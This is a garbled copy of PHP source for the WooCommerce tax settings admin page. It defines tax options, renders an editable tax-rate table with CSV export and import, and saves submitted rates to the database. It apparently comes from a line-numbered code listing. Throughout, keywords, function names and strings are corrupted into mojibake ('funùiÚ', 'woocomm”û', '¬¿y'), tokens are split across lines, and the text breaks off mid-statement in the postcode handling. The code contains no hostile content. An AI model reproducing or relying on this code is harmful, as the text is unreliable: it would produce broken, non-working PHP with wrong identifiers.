, 'add_settings_page' ), 20 );

28 
	`add_aùiÚ
Ğ'woocomm”û_£ùiÚs_' . 
$this
->
id
, 
	`¬¿y
( $this, 'output_sections' ) );

29 
	`add_aùiÚ
Ğ'woocomm”û_£‰šgs_' . 
$this
->
id
, 
	`¬¿y
( $this, 'output' ) );

30 
	`add_aùiÚ
Ğ'woocomm”û_£‰šgs_§ve_' . 
$this
->
id
, 
	`¬¿y
( $this, 'save' ) );

38 
public
 
funùiÚ
 
	$g‘_£ùiÚs
() {

39 
$£ùiÚs
 = 
	`¬¿y
(

40 '' => 
	`__
( 'Tax Options', 'woocommerce' ),

41 '¡ªd¬d' => 
	`__
( 'Standard Rates', 'woocommerce' )

45 
$x_şas£s
 = 
	`¬¿y_f‹r
Ğ
	`¬¿y_m­
Ğ'Œim', 
	`ex¶ode
Ğ"\n", 
	`g‘_İtiÚ
('woocommerce_tax_classes' ) ) ) );

47 iàĞ
$x_şas£s
 )

48 
	`fÜ—ch
 ( 
$x_şas£s
 
as
 
$şass
 )

49 
$£ùiÚs
[ 
	`§n™ize_t™Ë
Ğ
$şass
 ) ] = 
	`¥rštf
Ğ
	`__
( '%s Rates', 'woocommerce' ), $class );

51  
$£ùiÚs
;

52 
	}
}

59 
public
 
funùiÚ
 
	$g‘_£‰šgs
() {

60 
$x_şas£s
 = 
	`¬¿y_f‹r
Ğ
	`¬¿y_m­
Ğ'Œim', 
	`ex¶ode
Ğ"\n", 
	`g‘_İtiÚ
( 'woocommerce_tax_classes' ) ) ) );

61 
$şas£s_İtiÚs
 = 
	`¬¿y
();

62 iàĞ
$x_şas£s
 )

63 
	`fÜ—ch
 ( 
$x_şas£s
 
as
 
$şass
 )

64 
$şas£s_İtiÚs
[ 
	`§n™ize_t™Ë
Ğ
$şass
 ) ] = 
	`esc_html
( $class );

66  
	`­¶y_f‹rs
('woocomm”û_x_£‰šgs', 
	`¬¿y
(

68 
	`¬¿y
Ğ't™Ë' => 
	`__
( 'Tax Options', 'woocommerce' ), 'type' => 'title','desc' => '', 'id' => 'tax_options' ),

70 
	`¬¿y
(

71 't™Ë' => 
	`__
( 'Enable Taxes', 'woocommerce' ),

72 'desc' => 
	`__
( 'Enableaxes‡ndax calculations', 'woocommerce' ),

78 
	`¬¿y
(

79 't™Ë' => 
	`__
( 'Prices Entered With Tax', 'woocommerce' ),

83 'desc_t' => 
	`__
( 'This option is important‡s it will‡ffect how you input…rices. Changing it will‚ot updateƒxisting…roducts.', 'woocommerce' ),

84 'İtiÚs' => 
	`¬¿y
(

85 'yes' => 
	`__
( 'Yes, I willƒnter…rices inclusive ofax', 'woocommerce' ),

86 'no' => 
	`__
( 'No, I willƒnter…ricesƒxclusive ofax', 'woocommerce' )

90 
	`¬¿y
(

91 't™Ë' => 
	`__
( 'Calculate Tax Based On:', 'woocommerce' ),

93 'desc_t' => 
	`__
( 'This option determines which‡ddress is usedo calculateax.', 'woocommerce' ),

96 'İtiÚs' => 
	`¬¿y
(

97 'shpšg' => 
	`__
( 'Customer shipping‡ddress', 'woocommerce' ),

98 'blšg' => 
	`__
( 'Customer billing‡ddress', 'woocommerce' ),

99 'ba£' => 
	`__
( 'Shop base‡ddress', 'woocommerce' )

103 
	`¬¿y
(

104 't™Ë' => 
	`__
( 'Default Customer Address:', 'woocommerce' ),

106 'desc_t' => 
	`__
( 'This option determineshe customers default‡ddress (beforehey inputheir own).', 'woocommerce' ),

109 'İtiÚs' => 
	`¬¿y
(

110 '' => 
	`__
( 'No‡ddress', 'woocommerce' ),

111 'ba£' => 
	`__
( 'Shop base‡ddress', 'woocommerce' ),

115 
	`¬¿y
(

116 't™Ë' => 
	`__
( 'Shipping Tax Class:', 'woocommerce' ),

117 'desc' => 
	`__
( 'Optionally control whichax class shipping gets, or†eave it so shippingax is based onhe cart itemshemselves.', 'woocommerce' ),

122 'İtiÚs' => 
	`¬¿y
Ğ'' => 
	`__
Ğ'Shpšgax cÏs ba£d oÀÿ¹ i‹ms', 'woocomm”û' ), '¡ªd¬d' => __Ğ'Snd¬d', 'woocomm”û' ) ) + 
$şas£s_İtiÚs
,

123 'desc_t' => 
Œue
,

126 
	`¬¿y
(

127 't™Ë' => 
	`__
( 'Rounding', 'woocommerce' ),

128 'desc' => 
	`__
( 'Roundax‡t subtotal†evel, instead of„ounding…er†ine', 'woocommerce' ),

134 
	`¬¿y
(

135 't™Ë' => 
	`__
( 'Additional Tax Classes', 'woocommerce' ),

136 'desc' => 
	`__
( 'List‡dditionalax classes below (1…er†ine). This is in‡dditionohe default <code>Standard Rate</code>. Tax classes can be‡ssignedo…roducts.', 'woocommerce' ),

140 'deçuÉ' => 
	`¥rštf
Ğ
	`__
Ğ'Reduûd R©e%sZ”ØR©e', 'woocomm”û' ), 
PHP_EOL
 )

143 
	`¬¿y
(

144 't™Ë' => 
	`__
( 'Display…rices inhe shop:', 'woocommerce' ),

148 'İtiÚs' => 
	`¬¿y
(

149 'šş' => 
	`__
( 'Includingax', 'woocommerce' ),

150 'exş' => 
	`__
( 'Excludingax', 'woocommerce' ),

154 
	`¬¿y
(

155 't™Ë' => 
	`__
( 'Price display suffix:', 'woocommerce' ),

159 'desc' => 
	`__
( 'Defineexto show‡fter your…roduct…rices. This could be, forƒxample, "inc. Vat"oƒxplain your…ricing. You can‡lso have…rices substituted here using one ofhe following: <code>{price_including_tax}, {price_excluding_tax}</code>.', 'woocommerce' ),

162 
	`¬¿y
(

163 't™Ë' => 
	`__
( 'Display…rices during cart/checkout:', 'woocommerce' ),

167 'İtiÚs' => 
	`¬¿y
(

168 'šş' => 
	`__
( 'Includingax', 'woocommerce' ),

169 'exş' => 
	`__
( 'Excludingax', 'woocommerce' ),

171 'autŞßd' => 
çl£


174 
	`¬¿y
(

175 't™Ë' => 
	`__
( 'Displayaxotals:', 'woocommerce' ),

179 'İtiÚs' => 
	`¬¿y
(

180 'sšgË' => 
	`__
( 'As‡ singleotal', 'woocommerce' ),

181 '™emized' => 
	`__
( 'Itemized', 'woocommerce' ),

183 'autŞßd' => 
çl£


186 
	`¬¿y
( 'type' => 'sectionend', 'id' => 'tax_options' ),

189 
	}
}

194 
public
 
funùiÚ
 
	$ouut
() {

195 
glob®
 
$cu¼’t_£ùiÚ
;

197 
$x_şas£s
 = 
	`¬¿y_f‹r
Ğ
	`¬¿y_m­
Ğ'Œim', 
	`ex¶ode
Ğ"\n", 
	`g‘_İtiÚ
('woocommerce_tax_classes' ) ) ) );

199 iàĞ
$cu¼’t_£ùiÚ
 =ğ'¡ªd¬d' || 
	`š_¬¿y
Ğ$cu¼’t_£ùiÚ, 
	`¬¿y_m­
Ğ'§n™ize_t™Ë', 
$x_şas£s
 ) ) ) {

200 
$this
->
	`ouut_x_¿‹s
();

202 
$£‰šgs
 = 
$this
->
	`g‘_£‰šgs
();

204 
WC_Admš_S‘tšgs
::
	`ouut_f›lds
Ğ
$£‰šgs
 );

206 
	}
}

211 
public
 
funùiÚ
 
	$§ve
() {

212 
glob®
 
$cu¼’t_£ùiÚ
, 
$wpdb
;

214 iàĞ! 
$cu¼’t_£ùiÚ
 ) {

216 
$£‰šgs
 = 
$this
->
	`g‘_£‰šgs
();

217 
WC_Admš_S‘tšgs
::
	`§ve_f›lds
Ğ
$£‰šgs
 );

221 
$this
->
	`§ve_x_¿‹s
();

225 
$wpdb
->
	`qu”y
( "DELETE FROM `$wpdb->options` WHERE `option_name` LIKE ('_transient_wc_tax_rates_%') OR `option_name` LIKE ('_transient_timeout_wc_tax_rates_%')" );

226 
	}
}

231 
public
 
funùiÚ
 
	$ouut_x_¿‹s
() {

232 
glob®
 
$woocomm”û
, 
$cu¼’t_£ùiÚ
, 
$wpdb
;

234 
$·ge
 = ! 
	`em±y
Ğ
$_GET
['p'] ) ? 
	`absšt
( $_GET['p'] ) : 1;

235 
$lim™
 = 100;

236 
$x_şas£s
 = 
	`¬¿y_f‹r
Ğ
	`¬¿y_m­
Ğ'Œim', 
	`ex¶ode
Ğ"\n", 
	`g‘_İtiÚ
('woocommerce_tax_classes' ) ) ) );

237 
$cu¼’t_şass
 = '';

239 
	`fÜ—ch
Ğ
$x_şas£s
 
as
 
$şass
 )

240 iàĞ
	`§n™ize_t™Ë
Ğ
$şass
 ) =ğ
$cu¼’t_£ùiÚ
 )

241 
$cu¼’t_şass
 = 
$şass
;

243 <
h3
><?
php
 
	`´štf
Ğ
	`__
Ğ'Tax R©e fÜh"%s" CÏss', 'woocomm”û' ), 
$cu¼’t_şass
 ? 
	`esc_html
( $current_class ) : __( 'Standard', 'woocommerce' ) ); ?></h3>

244 <
p
><?
php
 
	`´štf
Ğ
	`__
( 'Defineax„ates for countries‡nd states below. <a href="%s">See here</a> for‡vailable‡lpha-2 country codes.', 'woocommerce' ), 'http://en.wikipedia.org/wiki/ISO_3166-1#Current_codes' ); ?></p>

245 <
bË
 
şass
="wc_tax_rates wc_input_table sortable widefat">

246 <
th—d
>

247 <
Œ
>

248 <
th
 
şass
="sÜt">&
nb¥
;</th>

250 <
th
 
width
="8%"><?
php
 
	`_e
Ğ'CouÁry&nb¥;Code', 'woocomm”û' ); ?>&
nb¥
;<
¥ª
 
şass
="ts" 
d©a
-
t
="<?php _e('A 2 digit country code,ƒ.g. US. Leave blanko‡pplyo‡ll.', 'woocommerce'); ?>">[?]</span></th>

252 <
th
 
width
="8%"><?
php
 
	`_e
Ğ'S‹&nb¥;Code', 'woocomm”û' ); ?>&
nb¥
;<
¥ª
 
şass
="ts" 
d©a
-
t
="<?php _e('A 2 digit state code,ƒ.g. AL. Leave blanko‡pplyo‡ll.', 'woocommerce'); ?>">[?]</span></th>

254 <
th
><?
php
 
	`_e
Ğ'ZIP/Po¡code', 'woocomm”û' ); ?>&
nb¥
;<
¥ª
 
şass
="ts" 
d©a
-
t
="<?php _e('Postcode forhis„ule. Semi-colon (;) separate multiple values. Leave blanko‡pplyo‡ll‡reas. Wildcards (*) can be used. Ranges for‚umeric…ostcodes (e.g. 12345-12350) will beƒxpanded into individual…ostcodes.', 'woocommerce'); ?>">[?]</span></th>

256 <
th
><?
php
 
	`_e
Ğ'C™y', 'woocomm”û' ); ?>&
nb¥
;<
¥ª
 
şass
="ts" 
d©a
-
t
="<?php _e('Cities forhis„ule. Semi-colon (;) separate multiple values. Leave blanko‡pplyo‡ll cities.', 'woocommerce'); ?>">[?]</span></th>

258 <
th
 
width
="8%"><?
php
 
	`_e
Ğ'R©e&nb¥;%', 'woocomm”û' ); ?>&
nb¥
;<
¥ª
 
şass
="ts" 
d©a
-
t
="<?php _e( 'Enter‡ax„ate (percentage)o 4 decimal…laces.', 'woocommerce' ); ?>">[?]</span></th>

260 <
th
 
width
="8%"><?
php
 
	`_e
Ğ'Tax&nb¥;Name', 'woocomm”û' ); ?>&
nb¥
;<
¥ª
 
şass
="ts" 
d©a
-
t
="<?php _e('Enter‡‚ame forhisax„ate.', 'woocommerce'); ?>">[?]</span></th>

262 <
th
 
width
="8%"><?
php
 
	`_e
Ğ'PriÜ™y', 'woocomm”û' ); ?>&
nb¥
;<
¥ª
 
şass
="ts" 
d©a
-
t
="<?php _e('Choose‡…riority forhisax„ate. Only 1 matching„ate…er…riority will be used. To define multipleax„ates for‡ single‡rea you‚eedo specify‡ different…riority…er„ate.', 'woocommerce'); ?>">[?]</span></th>

264 <
th
 
width
="8%"><?
php
 
	`_e
Ğ'Compound', 'woocomm”û' ); ?>&
nb¥
;<
¥ª
 
şass
="ts" 
d©a
-
t
="<?php _e('Choose whether or‚othis is‡ compound„ate. Compoundax„ates‡re‡pplied onop of otherax„ates.', 'woocommerce'); ?>">[?]</span></th>

266 <
th
 
width
="8%"><?
php
 
	`_e
Ğ'Shpšg', 'woocomm”û' ); ?>&
nb¥
;<
¥ª
 
şass
="ts" 
d©a
-
t
="<?php _e('Choose whether or‚othisax„ate‡lso gets‡ppliedo shipping.', 'woocommerce'); ?>">[?]</span></th>

268 </
Œ
>

269 </
th—d
>

270 <
tfoÙ
>

271 <
Œ
>

272 <
th
 
cŞ¥ª
="10">

273 <
a
 
h»f
="#" 
şass
="bu‰Ú…lu š£¹"><?
php
 
	`_e
( 'Insert„ow', 'woocommerce' ); ?></a>

274 <
a
 
h»f
="#" 
şass
="bu‰Ú mšu »move_x_¿‹s"><?
php
 
	`_e
( 'Remove selected„ow(s)', 'woocommerce' ); ?></a>

276 <
div
 
şass
="pagination">

277 <?
php


278 
echo
 
	`¡r_»¶aû
Ğ'·ge-numb”s', '·ge-numb” bu‰Ú', 
	`·gš©e_lšks
Ğ
	`¬¿y
(

279 'ba£' => 
	`add_qu”y_¬g
( 'p', '%#%' ),

283 'tÙ®' => 
	`û
Ğ
	`absšt
Ğ
$wpdb
->
	`g‘_v¬
Ğ$wpdb->
	`´•¬e
Ğ"SELECT COUNTÑax_¿‹_idèFROM {$wpdb->´efix}woocomm”û_x_¿‹ WHEREax_¿‹_şas ğ%s;", 
	`§n™ize_t™Ë
Ğ
$cu¼’t_şass
 ) ) ) ) / 
$lim™
 ),

284 'cu¼’t' => 
$·ge


287 </
div
>

289 <
a
 
h»f
="#" 
dowÆßd
="x_¿‹s.csv" 
şass
="bu‰ÚƒxpÜt"><?
php
 
	`_e
( 'Export CSV', 'woocommerce' ); ?></a>

290 <
a
 
h»f
="<?ph°echØadmš_u¾Ğ'admš.php?impÜt=woocomm”û_x_¿‹_csv' ); ?>" 
şass
="bu‰Ú impÜt"><?
php
 
	`_e
( 'Import CSV', 'woocommerce' ); ?></a>

291 </
th
>

292 </
Œ
>

293 </
tfoÙ
>

294 <
tbody
 
id
="rates">

295 <?
php


296 
$¿‹s
 = 
$wpdb
->
	`g‘_»suÉs
Ğ$wpdb->
	`´•¬e
(

298 
WHERE
 
x_¿‹_şass
 = %
s


299 
ORDER
 
BY
 
x_¿‹_Üd”


300 
LIMIT
 %
d
, %d

302 
	`§n™ize_t™Ë
Ğ
$cu¼’t_şass
 ),

303 Ğ
$·ge
 - 1 ) * 
$lim™
,

304 
$lim™


307 
	`fÜ—ch
 ( 
$¿‹s
 
as
 
$¿‹
 ) {

309 <
Œ
>

310 <
td
 
şass
="sÜt"><
šput
 
ty³
="hidd’" cÏss="»move_x_¿‹" 
Çme
="»move_x_¿‹[<?ph°echØ$¿‹->x_¿‹_id ?>]" 
v®ue
="0" /></td>

312 <
td
 
şass
="couÁry" 
width
="8%">

313 <
šput
 
ty³
="‹xt" 
v®ue
="<?ph°echØesc_©ŒĞ$¿‹->x_¿‹_couÁry ) ?>" 
¶aûhŞd”
="*" 
Çme
="tax_rate_country[<?phpƒcho $rate->tax_rate_id ?>]" />

314 </
td
>

316 <
td
 
şass
="¡©e" 
width
="8%">

317 <
šput
 
ty³
="‹xt" 
v®ue
="<?ph°echØesc_©ŒĞ$¿‹->x_¿‹_¡©è?>" 
¶aûhŞd”
="*" 
Çme
="tax_rate_state[<?phpƒcho $rate->tax_rate_id ?>]" />

318 </
td
>

320 <
td
 
şass
="postcode">

321 <
šput
 
ty³
="‹xt" 
v®ue
="<?php

322 
$loÿtiÚs
 = 
$wpdb
->
	`g‘_cŞ
Ğ$wpdb->
	`´•¬e
Ğ"SELECT†oÿtiÚ_codFROM {$wpdb->´efix}woocomm”û_x_¿‹_loÿtiÚ WHERE†oÿtiÚ_ty³='po¡code' ANDax_¿‹_id = %d ORDER BY†oÿtiÚ_code", 
$¿‹
->
x_¿‹_id
 ) );

324 
echo
 
	`esc_©Œ
Ğ
	`im¶ode
Ğ'; ', 
$loÿtiÚs
 ) );

325 ?>"…ÏûhŞd”="*" d©a-Çme="
x_¿‹_po¡code
[<?
php
 
echo
 
$¿‹
->
x_¿‹_id
 ?>]" />

326 </
td
>

328 <
td
 
şass
="city">

329 <
šput
 
ty³
="‹xt" 
v®ue
="<?php

330 
$loÿtiÚs
 = 
$wpdb
->
	`g‘_cŞ
Ğ$wpdb->
	`´•¬e
Ğ"SELECT†oÿtiÚ_codFROM {$wpdb->´efix}woocomm”û_x_¿‹_loÿtiÚ WHERE†oÿtiÚ_ty³='c™y' ANDax_¿‹_id = %d ORDER BY†oÿtiÚ_code", 
$¿‹
->
x_¿‹_id
 ) );

331 
echo
 
	`esc_©Œ
Ğ
	`im¶ode
Ğ'; ', 
$loÿtiÚs
 ) );

332 ?>"…ÏûhŞd”="*" d©a-Çme="
x_¿‹_c™y
[<?
php
 
echo
 
$¿‹
->
x_¿‹_id
 ?>]" />

333 </
td
>

335 <
td
 
şass
="¿‹" 
width
="8%">

336 <
šput
 
ty³
="numb”" 
¡•
="ªy" 
mš
="0" 
v®ue
="<?ph°echØesc_©ŒĞ$¿‹->x_¿‹ ) ?>" 
¶aûhŞd”
="0" 
Çme
="tax_rate[<?phpƒcho $rate->tax_rate_id ?>]" />

337 </
td
>

339 <
td
 
şass
="Çme" 
width
="8%">

340 <
šput
 
ty³
="‹xt" 
v®ue
="<?ph°echØesc_©ŒĞ$¿‹->x_¿‹_Çmè?>" 
Çme
="tax_rate_name[<?phpƒcho $rate->tax_rate_id ?>]" />

341 </
td
>

343 <
td
 
şass
="´iÜ™y" 
width
="8%">

344 <
šput
 
ty³
="numb”" 
¡•
="1" 
mš
="1" 
v®ue
="<?ph°echØesc_©ŒĞ$¿‹->x_¿‹_´iÜ™y ) ?>" 
Çme
="tax_rate_priority[<?phpƒcho $rate->tax_rate_id ?>]" />

345 </
td
>

347 <
td
 
şass
="compound" 
width
="8%">

348 <
šput
 
ty³
="checkbox" 
şass
="checkbox" 
Çme
="x_¿‹_compound[<?ph°echØ$¿‹->x_¿‹_id ?>]" <?
php
 
	`checked
Ğ
$¿‹
->
x_¿‹_compound
, '1' ); ?> />

349 </
td
>

351 <
td
 
şass
="­¶y_to_shpšg" 
width
="8%">

352 <
šput
 
ty³
="checkbox" 
şass
="checkbox" 
Çme
="x_¿‹_shpšg[<?ph°echØ$¿‹->x_¿‹_id ?>]" <?
php
 
	`checked
(
$¿‹
->
x_¿‹_shpšg
, '1' ); ?> />

353 </
td
>

354 </
Œ
>

355 <?
php


358 </
tbody
>

359 </
bË
>

360 <
süt
 
ty³
="text/javascript">

361 
	`jQu”y
Ğ
	`funùiÚ
() {

362 
	`jQu”y
('.wc_x_¿‹ .»move_x_¿‹s').
	`şick
(
	`funùiÚ
() {

363 
v¬
 
$tbody
 = 
	`jQu”y
('.wc_x_¿‹s').
	`fšd
('tbody');

364 iàĞ
$tbody
.
	`fšd
('Œ.cu¼’t').
	`size
() > 0 ) {

365 
$cu¼’t
 = 
$tbody
.
	`fšd
('tr.current');

366 
$cu¼’t
.
	`fšd
('šput').
	`v®
('');

367 
$cu¼’t
.
	`fšd
('šput.»move_x_¿‹').
	`v®
('1');

369 
$cu¼’t
.
	`—ch
(
	`funùiÚ
(){

370 iàĞ
	`jQu”y
(
this
).
	`is
('.new') )

371 
	`jQu”y
(
this
).
	`»move
();

373 
	`jQu”y
(
this
).
	`hide
();

376 
	`®”t
('<?ph°echØesc_jsĞ__Ğ'
No
 
	`row
(
s
è
£Ëùed
', '
woocomm”û
' ) ); ?>');

378  
çl£
;

381 
	`jQu”y
('.wc_x_¿‹ .expÜt').
	`şick
(
	`funùiÚ
() {

383 
v¬
 
csv_d©a
 = "data:application/csv;charset=utf-8,<?php _e( 'Country Code', 'woocommerce' ); ?>,<?php _e( 'State Code', 'woocommerce' ); ?>,<?php _e( 'ZIP/Postcode', 'woocommerce' ); ?>,<?php _e( 'City', 'woocommerce' ); ?>,<?php _e( 'Rate %', 'woocommerce' ); ?>,<?php _e( 'Tax Name', 'woocommerce' ); ?>,<?php _e( 'Priority', 'woocommerce' ); ?>,<?php _e( 'Compound', 'woocommerce' ); ?>,<?php _e( 'Shipping', 'woocommerce' ); ?>,<?php _e( 'Tax Class', 'woocommerce' ); ?>\n";

385 
	`jQu”y
('#¿‹ Œ:visibË').
	`—ch
(
	`funùiÚ
() {

386 
v¬
 
row
 = '';

387 
	`jQu”y
(
this
).
	`fšd
('td:nÙ(.sÜtèšput').
	`—ch
(
	`funùiÚ
() {

389 iàĞ
	`jQu”y
(
this
).
	`is
('.checkbox') ) {

391 iàĞ
	`jQu”y
(
this
).
	`is
(':checked') ) {

392 
v®
 = 1;

394 
v®
 = 0;

399 
v¬
 
v®
 = 
	`jQu”y
(
this
).
	`v®
();

401 iàĞ! 
v®
 )

402 
v®
 = 
	`jQu”y
(
this
).
	`©Œ
('placeholder');

405 
row
 =„ow + 
v®
 + ',';

407 
row
 =„ow + '<?phpƒcho $current_class; ?>';

409 
csv_d©a
 = csv_d©¨+ 
row
 + "\n";

412 
	`jQu”y
(
this
).
	`©Œ
Ğ'h»f', 
	`’codeURI
Ğ
csv_d©a
 ) );

414  
Œue
;

417 
	`jQu”y
('.wc_x_¿‹ .š£¹').
	`şick
(
	`funùiÚ
() {

418 
v¬
 
$tbody
 = 
	`jQu”y
('.wc_x_¿‹s').
	`fšd
('tbody');

419 
v¬
 
size
 = 
$tbody
.
	`fšd
('Œ').
	`size
();

420 
v¬
 
code
 = '<Œ cÏss="Ãw">\
<td cÏss="sÜt">&nb¥;</td>\
<td cÏss="couÁry" width="8%">\
<špuˆty³="‹xt"…ÏûhŞd”="*"‚ame="x_¿‹_couÁry[Ãw][' + 
size
 + ']" />\
</td>\
<td class="state" width="8%">\
<inputype="text"…laceholder="*"‚ame="tax_rate_state[new][' + size + ']" />\
</td>\
<td class="postcode">\
<inputype="text"…laceholder="*"‚ame="tax_rate_postcode[new][' + size + ']" />\
</td>\
<td class="city">\
<inputype="text"…laceholder="*"‚ame="tax_rate_city[new][' + size + ']" />\
</td>\
<td class="rate" width="8%">\
<inputype="number" step="any" min="0"…laceholder="0"‚ame="tax_rate[new][' + size + ']" />\
</td>\
<td class="name" width="8%">\
<inputype="text"‚ame="tax_rate_name[new][' + size + ']" />\
</td>\
<td class="priority" width="8%">\
<inputype="number" step="1" min="1" value="1"‚ame="tax_rate_priority[new][' + size + ']" />\
</td>\
<td class="compound" width="8%">\
<inputype="checkbox" class="checkbox"‚ame="tax_rate_compound[new][' + size + ']" />\
</td>\
<td class="apply_to_shipping" width="8%">\
<inputype="checkbox" class="checkbox"‚ame="tax_rate_shipping[new][' + size + ']" checked="checked" />\
</td>\
</tr>';

451 iàĞ
$tbody
.
	`fšd
('Œ.cu¼’t').
	`size
() > 0 ) {

452 
$tbody
.
	`fšd
('Œ.cu¼’t').
	`aá”
Ğ
code
 );

454 
$tbody
.
	`­³nd
Ğ
code
 );

457 
	`jQu”y
Ğ"td.couÁry iÅut" ).
	`autocom¶‘e
({

458 
sourû
: 
avaabËCouÁr›s
,

459 
mšL’gth
: 3

462 
	`jQu”y
Ğ"td.¡©šput" ).
	`autocom¶‘e
({

463 
sourû
: 
avaabËS‹s
,

464 
mšL’gth
: 3

467  
çl£
;

470 
	`jQu”y
('.wc_x_¿‹ td.po¡code, .wc_x_¿‹ td.c™y').
	`fšd
('šput').
	`chªge
(
	`funùiÚ
() {

471 
	`jQu”y
(
this
).
	`©Œ
( 'name', jQuery(this).attr( 'data-name' ) );

474 
v¬
 
avaabËCouÁr›s
 = [<?
php


475 
$couÁr›s
 = 
	`¬¿y
();

476 
	`fÜ—ch
 ( 
	`WC
()->
couÁr›s
->
	`g‘_®lowed_couÁr›s
(è
as
 
$v®ue
 => 
$Ïb–
 )

477 
$couÁr›s
[] = '{†ab–: "' . 
$Ïb–
 . '", v®ue: "' . 
$v®ue
 . '" }';

478 
echo
 
	`im¶ode
Ğ', ', 
$couÁr›s
 );

481 
v¬
 
avaabËS‹s
 = [<?
php


482 
$couÁr›s
 = 
	`¬¿y
();

483 
	`fÜ—ch
 ( 
	`WC
()->
couÁr›s
->
	`g‘_®lowed_couÁry_¡©es
(è
as
 
$v®ue
 => 
$Ïb–
 )

484 
	`fÜ—ch
 ( 
$Ïb–
 
as
 
$code
 => 
$¡©e
 )

485 
$couÁr›s
[] = '{†ab–: "' . 
$¡©e
 . '", v®ue: "' . 
$code
 . '" }';

486 
echo
 
	`im¶ode
Ğ', ', 
$couÁr›s
 );

489 
	`jQu”y
Ğ"td.couÁry iÅut" ).
	`autocom¶‘e
({

490 
sourû
: 
avaabËCouÁr›s
,

491 
mšL’gth
: 3

494 
	`jQu”y
Ğ"td.¡©šput" ).
	`autocom¶‘e
({

495 
sourû
: 
avaabËS‹s
,

496 
mšL’gth
: 3

499 </
süt
>

500 <?
php


501 
	}
}

506 
public
 
funùiÚ
 
	$§ve_x_¿‹s
() {

507 
glob®
 
$wpdb
, 
$cu¼’t_£ùiÚ
;

510 
$x_şas£s
 = 
	`¬¿y_f‹r
Ğ
	`¬¿y_m­
Ğ'Œim', 
	`ex¶ode
Ğ"\n", 
	`g‘_İtiÚ
('woocommerce_tax_classes' ) ) ) );

511 
$cu¼’t_şass
 = '';

513 
	`fÜ—ch
Ğ
$x_şas£s
 
as
 
$şass
 )

514 iàĞ
	`§n™ize_t™Ë
Ğ
$şass
 ) =ğ
$cu¼’t_£ùiÚ
 )

515 
$cu¼’t_şass
 = 
$şass
;

518 
$x_¿‹_couÁry
 = 
	`is£t
Ğ
$_POST
['x_¿‹_couÁry'] ) ? $_POST['x_¿‹_couÁry'] : 
	`¬¿y
();

519 
$x_¿‹_¡©e
 = 
	`is£t
Ğ
$_POST
['x_¿‹_¡©e'] ) ? $_POST['x_¿‹_¡©e'] : 
	`¬¿y
();

520 
$x_¿‹_po¡code
 = 
	`is£t
Ğ
$_POST
['x_¿‹_po¡code'] ) ? $_POST['x_¿‹_po¡code'] : 
	`¬¿y
();

521 
$x_¿‹_c™y
 = 
	`is£t
Ğ
$_POST
['x_¿‹_c™y'] ) ? $_POST['x_¿‹_c™y'] : 
	`¬¿y
();

522 
$x_¿‹
 = 
	`is£t
Ğ
$_POST
['x_¿‹'] ) ? $_POST['x_¿‹'] : 
	`¬¿y
();

523 
$x_¿‹_Çme
 = 
	`is£t
Ğ
$_POST
['x_¿‹_Çme'] ) ? $_POST['x_¿‹_Çme'] : 
	`¬¿y
();

524 
$x_¿‹_´iÜ™y
 = 
	`is£t
Ğ
$_POST
['x_¿‹_´iÜ™y'] ) ? $_POST['x_¿‹_´iÜ™y'] : 
	`¬¿y
();

525 
$x_¿‹_compound
 = 
	`is£t
Ğ
$_POST
['x_¿‹_compound'] ) ? $_POST['x_¿‹_compound'] : 
	`¬¿y
();

526 
$x_¿‹_shpšg
 = 
	`is£t
Ğ
$_POST
['x_¿‹_shpšg'] ) ? $_POST['x_¿‹_shpšg'] : 
	`¬¿y
();

528 
$i
 = 0;

531 
	`fÜ—ch
 ( 
$x_¿‹_couÁry
 
as
 
$key
 => 
$v®ue
 ) {

534 iàĞ
$key
 == 'new' ) {

536 
	`fÜ—ch
 ( 
$v®ue
 
as
 
$Ãw_key
 => 
$Ãw_v®ue
 ) {

539 
$couÁry
 = 
	`¡¹ouµ”
Ğ
	`wc_ş—n
Ğ
$x_¿‹_couÁry
[ 
$key
 ][ 
$Ãw_key
 ] ) );

540 
$¡©e
 = 
	`¡¹ouµ”
Ğ
	`wc_ş—n
Ğ
$x_¿‹_¡©e
[ 
$key
 ][ 
$Ãw_key
 ] ) );

541 
$po¡code
 = 
	`wc_ş—n
Ğ
$x_¿‹_po¡code
[ 
$key
 ][ 
$Ãw_key
 ] );

542 
$c™y
 = 
	`wc_ş—n
Ğ
$x_¿‹_c™y
[ 
$key
 ][ 
$Ãw_key
 ] );

543 
$¿‹
 = 
	`numb”_fÜm©
Ğ
	`wc_ş—n
Ğ
$x_¿‹
[ 
$key
 ][ 
$Ãw_key
 ] ), 4, '.', '' );

544 
$Çme
 = 
	`wc_ş—n
Ğ
$x_¿‹_Çme
[ 
$key
 ][ 
$Ãw_key
 ] );

545 
$´iÜ™y
 = 
	`absšt
Ğ
	`wc_ş—n
Ğ
$x_¿‹_´iÜ™y
[ 
$key
 ][ 
$Ãw_key
 ] ) );

546 
$compound
 = 
	`is£t
Ğ
$x_¿‹_compound
[ 
$key
 ][ 
$Ãw_key
 ] ) ? 1 : 0;

547 
$shpšg
 = 
	`is£t
Ğ
$x_¿‹_shpšg
[ 
$key
 ][ 
$Ãw_key
 ] ) ? 1 : 0;

549 iàĞ! 
$Çme
 )

550 
$Çme
 = 
	`__
( 'Tax', 'woocommerce' );

552 iàĞ
$couÁry
 == '*' )

553 
$couÁry
 = '';

555 iàĞ
$¡©e
 == '*' )

556 
$¡©e
 = '';

558 
$wpdb
->
	`š£¹
(

559 
$wpdb
->
´efix
 . "woocommerce_tax_rates",

560 
	`¬¿y
(

561 'x_¿‹_couÁry' => 
$couÁry
,

562 'x_¿‹_¡©e' => 
$¡©e
,

563 'x_¿‹' => 
$¿‹
,

564 'x_¿‹_Çme' => 
$Çme
,

565 'x_¿‹_´iÜ™y' => 
$´iÜ™y
,

566 'x_¿‹_compound' => 
$compound
,

567 'x_¿‹_shpšg' => 
$shpšg
,

568 'x_¿‹_Üd”' => 
$i
,

569 'x_¿‹_şass' => 
	`§n™ize_t™Ë
Ğ
$cu¼’t_şass
 )

573 
$x_¿‹_id
 = 
$wpdb
->
š£¹_id
;

575 iàĞ! 
	`em±y
Ğ
$po¡code
 ) ) {

576 
$po¡codes
 = 
	`ex¶ode
Ğ';', 
$po¡code
 );

577 
$po¡codes
 = 
	`¬¿y_m­
( 'strtoupper',‡rray_map( 'wc_clean', $postcodes ) );

579 
$po¡code_qu”y
 = 
	`¬¿y
();

581 
	`fÜ—ch
Ğ
$po¡codes
 
as
 
$po¡code
 )

582 iàĞ
	`¡r¡r
Ğ
$po¡code
, '-' ) ) {

583 
$po¡code_·¹s
 = 
	`ex¶ode
Ğ'-', 
$po¡code
 );

585 iàĞ
	`is_num”ic
Ğ
$po¡code_·¹s
